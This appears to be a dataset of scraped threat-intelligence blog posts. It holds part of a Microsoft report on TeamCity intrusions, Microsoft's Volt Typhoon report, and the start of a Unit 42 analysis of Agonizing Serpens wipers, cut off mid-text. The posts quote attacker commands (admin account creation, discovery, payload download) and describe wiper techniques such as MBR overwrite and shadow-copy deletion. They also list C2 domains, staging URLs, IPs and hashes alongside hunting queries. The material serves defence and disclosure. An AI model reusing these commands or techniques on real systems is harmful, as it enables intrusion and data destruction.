name FeedLoad.\nAfter successful compromise, Microsoft observed Diamond Sleet dumping credentials via the LSASS memory.\nIn some cases, Microsoft observed Diamond Sleet intrusions that utilized tools and techniques from both paths 1 and 2.\nOnyx Sleet attack path: User account creation, system discovery, and payload deployment Following successful exploitation using the TeamCity exploit, Onyx Sleet creates a new user account on compromised systems.\nThis account, named krtbgt, is likely intended to impersonate the legitimate Windows account name KRBTGT, the Kerberos Ticket Granting Ticket.\nAfter creating the account, the threat actor adds it to the Local Administrators Group through net use: net localgroup administrators krtbgt /add The threat actor also runs several system discovery commands on compromised systems, including: net localgroup 'Remote Desktop Users’ net localgroup Administrators cmd.exe \"/c tasklist | findstr Sec\" cmd.exe \"/c whoami\" cmd.exe \"/c netstat -nabp tcp\" cmd.exe \"/c ipconfig /all\" cmd.exe \"/c systeminfo\" Next, the threat actor deploys a unique payload to compromised systems by downloading it from attacker-controlled infrastructure via PowerShell.\nMicrosoft observed these file paths for the unique payload: - C:WindowsTemptemp.exe - C:WindowsADFSbginetmgr.exe This payload, when launched, loads and decrypts an embedded PE resource.\nThis decrypted payload is then loaded into memory and launched directly.\nThe inner payload is a proxy tool that helps establish a persistent connection between the compromised host and attacker-controlled infrastructure.\nMicrosoft Defender Antivirus detects this proxy tool as HazyLoad.\nMicrosoft also observed the following post-compromise tools and techniques leveraged in this attack path: - Using the attacker-controlled krtbgt account to sign into the compromised device via remote desktop protocol (RDP) - Stopping the TeamCity service, likely in an attempt to prevent access by other threat actors - Dumping credentials via the LSASS memory - Deploying tools to retrieve credentials and other data stored by browsers Recommended mitigation actions Microsoft recommends the following mitigations to reduce the impact of this threat. -\nApply the update or mitigations released by JetBrains to address CVE-2023-42793. -\nUse the included indicators of compromise to investigate whether they exist in your environment and assess for potential intrusion. -\nBlock in-bound traffic from IPs specified in the IOC table. -\nUse Microsoft Defender Antivirus to protect from this threat.\nTurn on cloud-delivered protection and automatic sample submission.\nThese capabilities use artificial intelligence and machine learning to quickly identify and stop new and unknown threats. -\nTake immediate action to address malicious activity on the impacted device.\nIf malicious code has been launched, the attacker has likely taken complete control of the device.\nImmediately isolate the system and perform a reset of credentials and tokens. -\nInvestigate the device timeline for indications of lateral movement activities using one of the compromised accounts.\nCheck for additional tools that attackers might have dropped to enable credential access, lateral movement, and other attack activities. -\nEnsure that “Safe DLL Search Mode” is set. -\nTurn on the following attack surface reduction rule: - Block executable files from running unless they meet a prevalence, age, or trusted list criterion Detections Microsoft 365 Defender Microsoft 365 Defender is becoming Microsoft Defender XDR.\nLearn more.\nMicrosoft Defender Vulnerability Management Microsoft Defender Vulnerability Management surfaces devices that may be affected by the CVE-2023-42793 vulnerability leveraged in these attacks.\nMicrosoft Defender Antivirus Microsoft Defender Antivirus customers should look for the following family names for activity related to these attacks: - ForestTiger - RollSling - FeedLoad - HazyLoad Microsoft Defender for Endpoint The following Microsoft Defender for Endpoint alerts could indicate activity associated with this threat.\nThese alerts, however, can be triggered by unrelated threat activity. -\nDiamond Sleet Actor activity detected - Onyx Sleet Actor activity detected - Possible exploitation of JetBrains TeamCity vulnerability - Suspicious behavior by cmd.exe was observed - Suspicious DLL loaded by an application - Suspicious PowerShell download or encoded command execution - Possible lateral movement involving suspicious file - A script with suspicious content was observed - Suspicious scheduled task Hunting queries Microsoft 365 Defender Command and control using iexpress.exe or wksprt.exe DeviceNetworkEvents | where (InitiatingProcessFileName =~ \"wksprt.exe\" and InitiatingProcessCommandLine == \"wksprt.exe\") or (InitiatingProcessFileName =~ \"iexpress.exe\" and InitiatingProcessCommandLine == \"iexpress.exe\") Search order hijack using Wsmprovhost.exe and DSROLE.dll DeviceImageLoadEvents | where InitiatingProcessFileName =~ \"wsmprovhost.exe\" | where FileName =~ \"DSROLE.dll\" | where not(FolderPath has_any(\"system32\", \"syswow64\")) Search order hijack using clip.exe and Version.dll DeviceImageLoadEvents | where InitiatingProcessFileName =~ \"clip.exe\" | where FileName in~(\"version.dll\") | where not(FolderPath has_any(\"system32\", \"syswow64\", \"program files\", \"windows defenderplatform\", \"winsxs\", \"platform\", \"trend micro\")) Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with ‘TI map’) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace.\nIf the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace.\nMicrosoft Sentinel also has a range of detection and threat hunting content that customers can use to detect the post exploitation activity detailed in this blog in addition to Microsoft 365 Defender detections list above. -\nPowerShell downloads - Dumping LSASS Process into a File - Anomalous Account Creation - RDP Rare Connection - Anomalous RDP Activity Indicators of compromise (IOCs) The list below provides IOCs observed during our investigation.\nWe encourage our customers to investigate these indicators in their environments and implement detections and protections to identify past related activity and prevent future attacks against their systems.\nDiamond Sleet path 1 | Indicator | Type | Description | |---|---|---| | C:ProgramDataForest64.exe | File path | File path of ForestTiger binary | | e06f29dccfe90ae80812c2357171b5c48fba189ae103d28e972067b107e58795 | SHA-256 | Hash of Forest64.exe | | 0be1908566efb9d23a98797884f2827de040e4cedb642b60ed66e208715ed4aa | SHA-256 | Hash of Forest64.exe | | C:ProgramData4800-84DC-063A6A41C5C | File path | ForestTiger configuration file | | hxxp://www.bandarpowder[.]com/public/assets/img/cfg.png | URL | Staging URL for 4800-84DC-063A6A41C5C (compromised domain) | | hxxps://www.bandarpowder[.]com/public/assets/img/cfg.png | URL | Staging URL for 4800-84DC-063A6A41C5C (compromised domain) | | hxxp://www.aeon-petro[.]com/wcms/plugins/addition_contents/cfg.png | URL | Staging URL for 4800-84DC-063A6A41C5C (compromised domain) | | hxxp://www.bandarpowder[.]com/public/assets/img/user64.png | URL | Staging URL for Forest64.exe (compromised domain) | | hxxps://www.bandarpowder[.]com/public/assets/img/user64.png | URL | Staging URL for Forest64.exe (compromised domain) | | hxxp://www.aeon-petro[.]com/wcms/plugins/addition_contents/user64.png | URL | Staging URL for Forest64.exe (compromised domain) | Diamond Sleet path 2 | Indicator | Type | Description | |---|---|---| | C:ProgramDataDSROLE.dll | File path | File path of RollSling binary | | d9add2bfdfebfa235575687de356f0cefb3e4c55964c4cb8bfdcdc58294eeaca | SHA-256 | Hash of DSROLE.dll | | C:ProgramDataVersion.dll | File path | File path of FeedLoad binary.\n| | f251144f7ad0be0045034a1fc33fb896e8c32874e0b05869ff5783e14c062486 | SHA-256 | Hash of Version.dll | | C:ProgramDatareadme.md | File path | Used as a multibyte XOR key for FeedLoad Next Stage | | fa7f6ac04ec118dd807c1377599f9d369096c6d8fb1ed24ac7a6ec0e817eaab6 | SHA-256 | Hash of Readme.md | | C:ProgramDatawsmprovhost.exe | File path | Legitimate Windows binary is copied to this directory for DLL search-order hijacking | | C:ProgramDataclip.exe | File path | Legitimate Windows binary is copied to this directory for DLL search-order hijacking | | dersmarketim[.]com | Domain | C2 domain (compromised domain) | | olidhealth[.]com | Domain | C2 domain (compromised domain) | | galerielamy[.]com | Domain | C2 domain (compromised domain) | | 3dkit[.]org | Domain | C2 domain (compromised domain) | | hxxp://www.mge[.]sn/themes/classic/modules/ps_rssfeed/feed.zip | URL | Staging URL for Version.dll (compromised domain) | | hxxp://www.mge[.]sn/themes/classic/modules/ps_rssfeed/feedmd.zip | URL | Staging URL for readme.md (compromised domain) | | hxxps://vadtalmandir[.]org/admin/ckeditor/plugins/icontact/about.php | URL | Callback URL from second-stage PE (compromised domain) | | hxxps://commune-fraita[.]ma/wp-content/plugins/wp-contact/contact.php | URL | Callback URL from second-stage PE (compromised domain) | Onyx Sleet path | Indicator | Type | Description | |---|---|---| | C:WindowsTemptemp.exe | File path | File path for HazyLoad binary | | C:WindowsADFSbginetmgr.exe | File path | File path for HazyLoad binary | | 000752074544950ae9020a35ccd77de277f1cd5026b4b9559279dc3b86965eee | SHA-256 | Hash of proxy tool loader | | hxxp://147.78.149[.]201:9090/imgr.ico | URL | Staging URL for HazyLoad binary (compromised infrastructure) | | hxxp://162.19.71[.]175:7443/bottom.gif | URL | Staging URL for HazyLoad binary (compromised infrastructure) | NOTE: These indicators should not be considered exhaustive for this observed activity.\nReferences Further reading For the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog: https://aka.ms/threatintelblog.\nTo get notified about new publications and to join discussions on social media, follow us on Twitter at https://twitter.com/MsftSecIntel.","num_sentences":77,"metadata":{"source":"blog","platform":"Microsoft","filename":"teamcity-cve"}}
{"id":68,"title":"Volt Typhoon targets US critical infrastructure with living-off-the-land techniques | Microsoft Security Blog","publish_date":null,"link":"https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/","clean_text":"Microsoft has uncovered stealthy and targeted malicious activity focused on post-compromise credential access and network system discovery aimed at critical infrastructure organizations in the United States.\nThe attack is carried out by Volt Typhoon, a state-sponsored actor based in China that typically focuses on espionage and information gathering.\nMicrosoft assesses with moderate confidence that this Volt Typhoon campaign is pursuing development of capabilities that could disrupt critical communications infrastructure between the United States and Asia region during future crises.\nVolt Typhoon has been active since mid-2021 and has targeted critical infrastructure organizations in Guam and elsewhere in the United States.\nIn this campaign, the affected organizations span the communications, manufacturing, utility, transportation, construction, maritime, government, information technology, and education sectors.\nObserved behavior suggests that the threat actor intends to perform espionage and maintain access without being detected for as long as possible.\nMicrosoft is choosing to highlight this Volt Typhoon activity at this time because of our significant concern around the potential for further impact to our customers.\nAlthough our visibility into these threats has given us the ability to deploy detections to our customers, the lack of visibility into other parts of the actor’s activity compelled us to drive broader community awareness and further investigations and protections across the security ecosystem.\nTo achieve their objective, the threat actor puts strong emphasis on stealth in this campaign, relying almost exclusively on living-off-the-land techniques and hands-on-keyboard activity.\nThey issue commands via the command line to (1) collect data, including credentials from local and network systems, (2) put the data into an archive file to stage it for exfiltration, and then (3) use the stolen valid credentials to maintain persistence.\nIn addition, Volt Typhoon tries to blend into normal network activity by routing traffic through compromised small office and home office (SOHO) network equipment, including routers, firewalls, and VPN hardware.\nThey have also been observed using custom versions of open-source tools to establish a command and control (C2) channel over proxy to further stay under the radar.\nIn this blog post, we share information on Volt Typhoon, their campaign targeting critical infrastructure providers, and their tactics for achieving and maintaining unauthorized access to target networks.\nBecause this activity relies on valid accounts and living-off-the-land binaries (LOLBins), detecting and mitigating this attack could be challenging.\nCompromised accounts must be closed or changed.\nAt the end of this blog post, we share more mitigation steps and best practices, as well as provide details on how Microsoft 365 Defender detects malicious and suspicious activity to protect organizations from such stealthy attacks.\nThe National Security Agency (NSA) has also published a Cybersecurity Advisory [PDF] which contains a hunting guide for the tactics, techniques, and procedures (TTPs) discussed in this blog.\nAs with any observed nation-state actor activity, Microsoft has directly notified targeted or compromised customers, providing them with important information needed to secure their environments.\nTo learn about Microsoft’s approach to threat actor tracking, read Microsoft shifts to a new threat actor naming taxonomy.\nInitial access Volt Typhoon achieves initial access to targeted organizations through internet-facing Fortinet FortiGuard devices.\nMicrosoft continues to investigate Volt Typhoon’s methods for gaining access to these devices.\nThe threat actor attempts to leverage any privileges afforded by the Fortinet device, extracts credentials to an Active Directory account used by the device, and then attempts to authenticate to other devices on the network with those credentials.\nVolt Typhoon proxies all its network traffic to its targets through compromised SOHO network edge devices (including routers).\nMicrosoft has confirmed that many of the devices, which include those manufactured by ASUS, Cisco, D-Link, NETGEAR, and Zyxel, allow the owner to expose HTTP or SSH management interfaces to the internet.\nOwners of network edge devices should ensure that management interfaces are not exposed to the public internet in order to reduce their attack surface.\nBy proxying through these devices, Volt Typhoon enhances the stealth of their operations and lowers overhead costs for acquiring infrastructure.\nPost-compromise activity Once Volt Typhoon gains access to a target environment, they begin conducting hands-on-keyboard activity via the command line.\nSome of these commands appear to be exploratory or experimental, as the operators adjust and repeat them multiple times.\nVolt Typhoon rarely uses malware in their post-compromise activity.\nInstead, they rely on living-off-the-land commands to find information on the system, discover additional devices on the network, and exfiltrate data.\nWe describe their activities in the following sections, including the most impactful actions that relate to credential access.\nCredential access If the account that Volt Typhoon compromises from the Fortinet device has privileged access, they use that account to perform the following credential access activities.\nMicrosoft has observed Volt Typhoon attempting to dump credentials through the Local Security Authority Subsystem Service (LSASS).\nThe LSASS process memory space contains hashes for the current user’s operating system (OS) credentials.\nVolt Typhoon also frequently attempts to use the command-line tool Ntdsutil.exe to create installation media from domain controllers, either remotely or locally.\nThese media are intended to be used in the installation of new domain controllers.\nThe files in the installation media contain usernames and password hashes that the threat actors can crack offline, giving them valid domain account credentials that they could use to regain access to a compromised organization if they lose access.\nDiscovery Microsoft has observed Volt Typhoon discovering system information, including file system types; drive names, size, and free space; running processes; and open networks.\nThey also attempt to discover other systems on the compromised network using PowerShell, Windows Management Instrumentation Command-line (WMIC), and the ping command.\nIn a small number of cases, the threat actors run system checks to determine if they are operating within a virtualized environment.\nCollection In addition to operating system and domain credentials, Volt Typhoon dumps information from local web browser applications.\nMicrosoft has also observed the threat actors staging collected data in password-protected archives.\nCommand and control In most cases, Volt Typhoon accesses compromised systems by signing in with valid credentials, the same way authorized users do.\nHowever, in a small number of cases, Microsoft has observed Volt Typhoon operators creating proxies on compromised systems to facilitate access.\nThey accomplish this with the built-in netsh portproxy command.\nIn rare cases, they also use custom versions of open-source tools Impacket and Fast Reverse Proxy (FRP) to establish a C2 channel over proxy.\nCompromised organizations will observe C2 access in the form of successful sign-ins from unusual IP addresses.\nThe same user account used for these sign-ins may be linked to command-line activity conducting further credential access.\nMicrosoft will continue to monitor Volt Typhoon and track changes in their activity and tooling.\nMitigation and protection guidance Mitigating risk from adversaries like Volt Typhoon that rely on valid accounts and living-off-the-land binaries (LOLBins) is particularly challenging.\nDetecting activity that uses normal sign-in channels and system binaries requires behavioral monitoring.\nRemediation requires closing or changing credentials for compromised accounts.\nSuspected compromised accounts or affected systems should be investigated: - Identify LSASS dumping and domain controller installation media creation to identify affected accounts. -\nExamine the activity of compromised accounts for any malicious actions or exposed data. -\nClose or change credentials for all compromised accounts.\nDepending on the level of collection activity, many accounts may be affected.\nDefending against this campaign - Mitigate the risk of compromised valid accounts by enforcing strong multi-factor authentication (MFA) policies using hardware security keys or Microsoft Authenticator.\nPasswordless sign-in, password expiration rules, and deactivating unused accounts can also help mitigate risk from this access method. -\nReduce the attack surface.\nMicrosoft customers can turn on the following attack surface reduction rules to block or audit some observed activity associated with this threat: - Block credential stealing from the Windows local security authority subsystem (lsass.exe).Block process creations originating from PSExec and WMI commands.\nSome organizations may experience compatibility issues with this rule on certain server systems but should deploy it to other systems to prevent lateral movement originating from PsExec and WMI. -\nBlock execution of potentially obfuscated scripts. -\nHarden the LSASS process by enabling Protective Process Light (PPL) for LSASS on Windows 11 devices.\nNew, enterprise-joined Windows 11 (22H2 update) installs have this feature enabled by default.\nIn addition, enable Windows Defender Credential Guard, which is also turned on by default for organizations using the Enterprise edition of Windows 11. -\nTurn on cloud-delivered protection in Microsoft Defender Antivirus to cover rapidly evolving attacker tools, techniques, and behaviors such as those exhibited by Volt Typhoon. -\nRun endpoint detection and response (EDR) in block mode so that Microsoft Defender for Endpoint can block malicious artifacts, even when your non-Microsoft antivirus does not detect the threat, or when Microsoft Defender Antivirus is running in passive mode.\nEDR in block mode works behind the scenes to remediate malicious artifacts that are detected post-compromise.\nDetection details and hunting queries Microsoft Defender Antivirus Microsoft Defender Antivirus detects attempted post-compromise activity.\nNote, however, that these alerts can also be triggered by threat activity unrelated to Volt Typhoon.\nTurn on cloud-delivered protection to cover rapidly evolving attacker tools and techniques.\nCloud-based machine learning protections block most new and unknown threats. -\nBehavior:Win32/SuspNtdsUtilUsage.\nA - Behavior:Win32/SuspPowershellExec.\nE - Behavior:Win32/SuspRemoteCmdCommandParent.\nA - Behavior:Win32/UNCFilePathOperation - Behavior:Win32/VSSAmsiCaller.\nA - Behavior:Win32/WinrsCommand.\nA - Behavior:Win32/WmiSuspProcExec.\nJ!se - Behavior:Win32/WmicRemote.\nA - Behavior:Win32/WmiprvseRemoteProc.\nB Microsoft Defender for Endpoint Microsoft Defender for Endpoint alerts with the following titles can indicate possible presence of Volt Typhoon activity. -\nVolt Typhoon threat actor detected The following alerts may also be associated with Volt Typhoon activity.\nNote, however, that these alerts can also be triggered by threat activity unrelated to Volt Typhoon. -\nA machine was configured to forward traffic to a non-local address - Ntdsutil collecting Active Directory information - Password hashes dumped from LSASS memory - Suspicious use of wmic.exe to execute code - Impacket toolkit Hunting queries Microsoft 365 Defender Volt Typhoon’s post-compromise activity usually includes distinctive commands.\nSearching for these can help to determine the scope and impact of an incident.\nFind commands creating domain controller installation media This query can identify domain controller installation media creation commands similar to those used by Volt Typhoon.\nDeviceProcessEvents | where ProcessCommandLine has_all (\"ntdsutil\", \"create full\", \"pro\") Find commands establishing internal proxies This query can identify commands that establish internal proxies similar to those used by Volt Typhoon.\nDeviceProcessEvents | where ProcessCommandLine has_all (\"portproxy\", \"netsh\", \"wmic\", \"process call create\", \"v4tov4\") Find detections of custom FRP executables This query can identify alerts on files that match the SHA-256 hashes of known Volt Typhoon custom FRP binaries.\nAlertEvidence | where SHA256 in ('baeffeb5fdef2f42a752c65c2d2a52e84fb57efc906d981f89dd518c314e231c', 'b4f7c5e3f14fb57be8b5f020377b993618b6e3532a4e1eb1eae9976d4130cc74', '4b0c4170601d6e922cf23b1caf096bba2fade3dfcf92f0ab895a5f0b9a310349', 'c0fc29a52ec3202f71f6378d9f7f9a8a3a10eb19acb8765152d758aded98c76d', 'd6ab36cb58c6c8c3527e788fc9239d8dcc97468b6999cf9ccd8a815c8b4a80af', '9dd101caee49c692e5df193b236f8d52a07a2030eed9bd858ed3aaccb406401a', '450437d49a7e5530c6fb04df2e56c3ab1553ada3712fab02bd1eeb1f1adbc267', '93ce3b6d2a18829c0212542751b309dacbdc8c1d950611efe2319aa715f3a066', '7939f67375e6b14dfa45ec70356e91823d12f28bbd84278992b99e0d2c12ace5', '389a497f27e1dd7484325e8e02bbdf656d53d5cf2601514e9b8d8974befddf61', 'c4b185dbca490a7f93bc96eefb9a597684fdf532d5a04aa4d9b4d4b1552c283b', 'e453e6efc5a002709057d8648dbe9998a49b9a12291dee390bb61c98a58b6e95', '6036390a2c81301a23c9452288e39cb34e577483d121711b6ba6230b29a3c9ff', 'cd69e8a25a07318b153e01bba74a1ae60f8fc28eb3d56078f448461400baa984', '17506c2246551d401c43726bdaec800f8d41595d01311cf38a19140ad32da2f4', '8fa3e8fdbaa6ab5a9c44720de4514f19182adc0c9c6001c19cf159b79c0ae9c2', 'd17317e1d5716b09cee904b8463a203dc6900d78ee2053276cc948e4f41c8295', '472ccfb865c81704562ea95870f60c08ef00bcd2ca1d7f09352398c05be5d05d', '3e9fc13fab3f8d8120bd01604ee50ff65a40121955a4150a6d2c007d34807642') Microsoft Sentinel Below are some suggested queries to assist Microsoft Sentinel customers in identifying Volt Typhoon activity in their environment: - LSASS process memory dumping - Potential Impacket execution - Domain controller installation media creation commands similar to those used by Volt Typhoon - Commands that set up internal proxies resembling the ones employed by Volt Typhoon Microsoft customers can use the TI Mapping analytics (a series of analytics all prefixed with ‘TI map’) to automatically match the malicious hash indicators (related to the custom Fast Reverse Proxy binaries) mentioned in this blog post.\nThese analytics are part of the Threat Intelligence solution and can be installed from the Microsoft Sentinel Content Hub if not currently deployed.\nMore details on the Content Hub can be found here: https://learn.microsoft.com/azure/sentinel/sentinel-solutions-deploy.\nIndicators of compromise (IOCs) The below list provides IOCs observed during our investigation.\nWe encourage our customers to investigate these indicators in their environments and implement detections and protection to identify past related activity and prevent future attacks against their systems.\nVolt Typhoon custom FRP executable (SHA-256): - baeffeb5fdef2f42a752c65c2d2a52e84fb57efc906d981f89dd518c314e231c - b4f7c5e3f14fb57be8b5f020377b993618b6e3532a4e1eb1eae9976d4130cc74 - 4b0c4170601d6e922cf23b1caf096bba2fade3dfcf92f0ab895a5f0b9a310349 - c0fc29a52ec3202f71f6378d9f7f9a8a3a10eb19acb8765152d758aded98c76d - d6ab36cb58c6c8c3527e788fc9239d8dcc97468b6999cf9ccd8a815c8b4a80af - 9dd101caee49c692e5df193b236f8d52a07a2030eed9bd858ed3aaccb406401a - 450437d49a7e5530c6fb04df2e56c3ab1553ada3712fab02bd1eeb1f1adbc267 - 93ce3b6d2a18829c0212542751b309dacbdc8c1d950611efe2319aa715f3a066 - 7939f67375e6b14dfa45ec70356e91823d12f28bbd84278992b99e0d2c12ace5 - 389a497f27e1dd7484325e8e02bbdf656d53d5cf2601514e9b8d8974befddf61 - c4b185dbca490a7f93bc96eefb9a597684fdf532d5a04aa4d9b4d4b1552c283b - e453e6efc5a002709057d8648dbe9998a49b9a12291dee390bb61c98a58b6e95 - 6036390a2c81301a23c9452288e39cb34e577483d121711b6ba6230b29a3c9ff - cd69e8a25a07318b153e01bba74a1ae60f8fc28eb3d56078f448461400baa984 - 17506c2246551d401c43726bdaec800f8d41595d01311cf38a19140ad32da2f4 - 8fa3e8fdbaa6ab5a9c44720de4514f19182adc0c9c6001c19cf159b79c0ae9c2 - d17317e1d5716b09cee904b8463a203dc6900d78ee2053276cc948e4f41c8295 - 472ccfb865c81704562ea95870f60c08ef00bcd2ca1d7f09352398c05be5d05d - 3e9fc13fab3f8d8120bd01604ee50ff65a40121955a4150a6d2c007d34807642","num_sentences":94,"metadata":{"source":"blog","platform":"Microsoft","filename":"volt-typhoon"}}
{"id":69,"title":"Agonizing Serpens (Aka Agrius) Targeting the Israeli Higher Education and Tech Sectors","publish_date":"2023-01-28","link":"https://unit42.paloaltonetworks.com/agonizing-serpens-targets-israeli-tech-higher-ed-sectors/","clean_text":"Executive Summary Unit 42 researchers have investigated a series of destructive cyberattacks beginning in January 2023 and continuing as recently as October 2023, targeting the education and technology sectors in Israel.\nThe attacks are characterized by attempts to steal sensitive data, such as personally identifiable information (PII) and intellectual property.\nOnce the attackers stole the information, they deployed various wipers intended to cover the attackers’ tracks and to render the infected endpoints unusable.\nOur investigation revealed the perpetrators of the attacks have strong connections to an Iranian-backed APT group Unit 42 tracks as Agonizing Serpens (aka Agrius, BlackShadow, Pink Sandstorm, DEV-0022).\nUnit 42 researchers were also able to identify novel new wipers and tools that Agonizing Serpens used in their most recent attacks: - MultiLayer wiper - PartialWasher wiper - BFG Agonizer wiper - Sqlextractor - a custom tool to extract information from database servers Based on forensic evidence, it appears that the Agonizing Serpens APT group has recently upgraded their capabilities and they are investing great efforts and resources to attempt to bypass endpoint detection and response (EDR) and other security measures.\nTo do so, they have been rotating between using different known proof of concept (PoC) and pentesting tools as well as custom tools.\nFor the attacks described below, the attacker was unsuccessful at bypassing Cortex XDR.\nCortex XDR and XSIAM detect and prevent the execution flow described.\nThey also build behavioral profiles of user activity over time with machine learning, allowing them to detect anomalous activity indicative of, for example, credential-based attacks.\nWe are sharing this research to provide detection, prevention and hunting recommendations to help organizations protect against the threats associated with Agonizing Serpens.\n| Related Unit 42 Topics | APT, Education | Who Is the Agonizing Serpens APT Group?\nAgonizing Serpens (aka Agrius) is an Iranian-linked APT group that has been active since 2020.\nThe group is known for its destructive wiper and fake-ransomware attacks and mainly targets Israeli organizations across multiple industries and countries.\nThough earlier reports of these attacks mentioned ransomware and ransom notes, these turned out to be a ruse (a trend noted in the 2023 Unit 42 Ransomware and Extortion Report).\nIn the most recent attacks, the attackers did not request ransom – rather, the potential result of the attacks was vast data loss and disruptions of business continuity.\nAttacks from Agonizing Serpens usually have two main goals, the first being stealing sensitive information that includes PII and intellectual property, which threat actors then publish on social media or Telegram channels.\nIt seems likely that their motivation to publish on social media is to sow fear or inflict reputational damage.\nThe second goal is wreaking havoc and inflicting considerable damage by wiping as many endpoints as possible.\nSince its emergence, the group has developed new custom tools and they have also leveraged known hacking tools and techniques to carry out their aggressive operations.\nTechnical Analysis The following sections detail the different stages of a recent incident carried out by Agonizing Serpens in October 2023, as analyzed by Unit 42 researchers.\nEntry Vector The attackers gained initial access to the environment by exploiting vulnerable internet facing web servers.\nSubsequently, they deployed multiple web shells, which granted them a foothold in the network.\nThe web shells that threat actors used in the described attack (shown in Figure 1) contain the same code as web shells that were observed in previous Agonizing Serpens attacks, with variations to the naming of functions.\nThe web shells appear to be variations of ASPXSpy.\nAnother web shell used in this attack was named Uploader.aspx.\nFigure 2 shows almost identical code found in two web shells used by Agonizing Serpens, one from a recent attack and the other from a past attack.\nFigure 3 shows how, shortly after the attackers deployed the web shells, they started to execute basic reconnaissance commands via the web shells.\nReconnaissance To map out the network, the attackers used various known and publicly available scanners.\nNbtscan The attackers used Nbtscan, renamed as systems.txt, to scan the network for existing hosts (shown in Figure 4).\nWinEggDrop Figure 5 shows how the attackers used an open-source SYN/TCP port scanner by WinEggDrop to scan particular hosts of interest.\nNimScan NimScan is another publicly available port scanner that the attackers used in the attack, as shown in Figure 6.\nCredential Stealing A crucial phase of the attack consisted of obtaining credentials of users with administrative privileges.\nTo do so, the attackers tried multiple methods to obtain credentials, which were prevented by the Cortex XDR platform: - Mimikatz (filename: Mimi.exe) - SMB password spraying - SMB password brute force (shown in Figure 7) - Dumping the SAM file (shown in Figure 8) Lateral Movement Figure 9 shows that to move laterally in the environment, the attackers mostly used Plink (renamed as systems.exe) to create remote tunneling and establish connections to remote machines.\nStealing and Exfiltrating Data Attackers attempted to steal information from databases and other critical servers before executing wipers to cover their tracks.\nThey then tried to exfiltrate this information to the attackers’ C2 servers, using different publicly available tools such as WinSCP and Putty.\nExtracting Database Information Using Sqlextractor The attackers used a custom tool they named sqlextractor (binary name sql.net4.exe).\nIts purpose is to query SQL databases and extract sensitive PII data, such as the following: - ID numbers - Passport scans - Emails - Full addresses The data was saved into CSV files as shown in Figures 10 and 11.\nThe tool writes the data to a hard-coded staging path: C:\\windows\\temp\\s\\. Figure 10 shows the attackers then used 7za.exe to archive the extracted data in preparation for exfiltration.\nFigure 12 shows the attackers also used 7zG.exe to archive interesting folders in the infected environment.\nData Exfiltration Using WinSCP The attackers attempted to use WinSCP to exfiltrate files from the environment, as shown in Figures 13 and 14.\nData Exfiltration Using Pscp.exe (PuTTY Secure Copy Protocol) Figure 15 shows that another tool the attackers used for exfiltration is pscp.exe (PuTTY Secure Copy Protocol).\nThe attackers attempted to establish a connection to the C2, then searched for .7z and .ezip files that contain stolen data, as well as .dmp files created by ProcDump.\nWiper Payloads During the incident, the attackers attempted to use three separate wipers as part of the destructive attack.\nWhile some of the wipers show code similarities to previously reported wipers the Agonizing Serpens group used, others are considered brand new.\nThese have been used for the first time in this attack, as detailed in the following section.\nMultiLayer Wiper The first wiper that the attackers used is .NET malware called MultiLayer.\nAs its name suggests, this wiper contains multiple layers and stages.\nIts compilation date is Oct. 14, 2093.\nAs this is set to a future date, it is a clear sign of metadata manipulation.\nFigure 16 shows that it contains two more binaries in its resources section, named MultiList and MultiWip.\nMultiLayer drops and executes each of the aforementioned binaries, then deletes them right after their execution.\nThe MultiList Component - Setting the Target Files MultiList generates a list of all the files and their paths on the fixed drives on the system.\nIt does this by enumerating all files on the infected operating system while excluding specific folders defined in a predefined list (shown in Figure 17).\nThe attackers can define the path to which this tool should store the list via the command line.\nMultiWip - the Core Wiper Component The MultiWip component contains the actual file wiping functionality.\nIt relies on the previous component (MultiList) and reads the output list of files to wipe, which is passed as a command-line argument.\nMultiWip’s main function is called DoJob() and is responsible for carrying out the file-wiping activity in the manner shown in Figure 18.\nThe malware takes the following steps in the order indicated: - Files located on network drives are deleted immediately. -\nLocally stored files are corrupted and overwritten with random data to thwart file recovery efforts, as shown in Figure 19. -\nThe malware changes the original timestamps in the following FileSystemInfo properties: LastAccessTime, LastWriteTime and CreationTime.\nThis is a well-known anti-forensic timestomping technique.\nThe malware timestomps according to the file system.\nIf the file system is NTFS, the malware sets the timestamp to 1601.1.1.\nAny other file system, the malware sets it to 1980.1.1 (shown in Figure 20). -\nThe malware changes the original paths of the deleted files, using Path.\nGetRandomFileName, to make any recovery efforts extremely hard. -\nFinally, the malware deletes the files.\nCovering Tracks and Rendering the System Unusable MultiLayer is designed to cover its tracks by erasing evidence of its execution.\nIt does so by running various commands to prevent restoration of lost data and to render the disk unusable.\nFigure 21 shows that MultiLayer uses the DeleteLogs() function to create a scheduled task that launches a batch script only once.\nThe script then removes all the Windows Event Logs.\nTo remain stealthy, MultiLayer removes all the files it uses after its execution, including itself.\nTo remove itself, MultiLayer uses SelfDelete().\nThe removal is implemented by threat actors writing a batch file named remover.bat to %TEMP% and executing it.\nThe batch file deletes the assembly file and the batch itself, and then it clears the file system cache memory, leveraging the ProcessIdleTasks export in advapi32.dll.\nTo further prevent data restoration, MultiLayer tries to remove all shadow copies on the system as shown in Figure 22, and then remove the Volume Shadow Copy (VSS) service itself.\nFigure 23 shows that, to ensure that the system can no longer boot, MultiLayer opens a handle to \\\\\\\\.\\\\PhysicalDrive0 and wipes the first 512 bytes (aka the boot sector).\nFinally, after the boot sector is corrupted, MultiLayer adjusts its privileges to SeShutdownPrivilege and calls the Windows API ExitWindowsEx with the EWX_REBOOT flag, which indicates system reboot.\nOnce the system reboots, it will not be able to boot again.\nThe attempt to execute MultiLayer was prevented by Cortex XDR, as depicted in Figure 24 below.\nSimilarities to Apostle, IPsec Helper, and Fantasy Throughout our analysis of MultiLayer, we noticed multiple code overlaps with Apostle, IPsec Helper and Fantasy.\nThese are custom tools previously used by Agonizing Serpens.\nThis might be the result of a shared codebase or being written by the same team of developers.\nWhen comparing the code of the aforementioned tools, it appears that MultiLayer shares naming conventions and even entire code blocks with them.\nExample 1: Self-Deletion Mechanism The self-deletion mechanism of MultiLayer is implemented in a similar manner to IPsec Helper, Apostle and Fantasy.\nThey share the same name for the function, named SelfDelete().\nThey also delete themselves by writing a batch file named remover.bat to %TEMP% and executing it, using the above mentioned functions shown in Figures 25 and 26.\nExample 2: 